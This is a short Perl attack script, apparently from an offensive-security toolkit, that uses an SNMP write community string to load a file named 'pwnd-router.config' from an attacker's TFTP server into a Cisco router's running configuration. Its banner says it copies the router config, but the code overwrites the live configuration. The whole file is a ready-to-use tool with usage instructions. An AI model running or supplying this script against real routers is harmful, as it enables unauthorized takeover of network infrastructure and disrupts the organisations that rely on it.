#!/usr/bin/perl


#Modified by Vincent C. Passaro
# April 8 2013
#www.buddhlabs.com
#www.hackports.com
#
#Adde perl5.12 as default perl bin.
#Corrected the print usage

if ($#ARGV != 2) {
 print "\n######################################################\n";
 print "# Copy Cisco Router config  - Using SNMP\n";
 print "# Hacked up by muts - muts\@offensive-security.com\n";
 print "#######################################################\n";

 print "\nUsage : ./copy-router-config.pl <router-ip> <tftp-serverip> <community> \n";
 print "\nMake sure a TFTP server is set up, prefferably running from /tmp ! \n\n";
 exit;
}

use Cisco::CopyConfig;

    $|          = 1; # autoflush output
    $tftp       = $ARGV[1];
    $merge_f    = 'pwnd-router.config';
    $host       = $ARGV[0];;
    $comm       = $ARGV[2];;
    $config     = Cisco::CopyConfig->new(
                     Host => $host,
                     Comm => $comm
    );
    $path       = "/tmp/${merge_f}"; 

    print "${tftp}:${merge_f} -> ${host}:running-config... ";

    if ($config->copy($tftp, $merge_f)) {  # copy the new config

      print "OK\n";
    } 
    else {
      die $config->error();
    }
